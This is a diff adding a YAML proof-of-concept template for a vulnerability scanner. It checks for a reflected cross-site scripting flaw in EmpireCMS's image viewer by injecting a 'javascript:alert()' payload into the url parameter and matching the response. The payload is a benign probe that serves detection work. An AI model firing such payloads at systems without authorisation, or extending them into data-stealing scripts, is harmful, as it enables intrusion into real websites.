@@ -1,0 +1,13 @@
+name: poc-yaml-empirecms-xss
+set:
+  r1: randomInt(40000, 44800)
+rules:
+  - method: GET
+    path: /e/ViewImg/index.html?url=javascript:alert(/{{r1}}/)
+    follow_redirects: false
+    expression: |
+      response.status == 200  && "Set-Cookie" in response.headers && response.headers["Set-Cookie"].contains("expires") && response.body.bcontains(b"return bbimg(this)")
+detail:
+  author: jweny(https://github.com/jweny)
+  links:
+    - https://www.geek-share.com/detail/2777280260.html
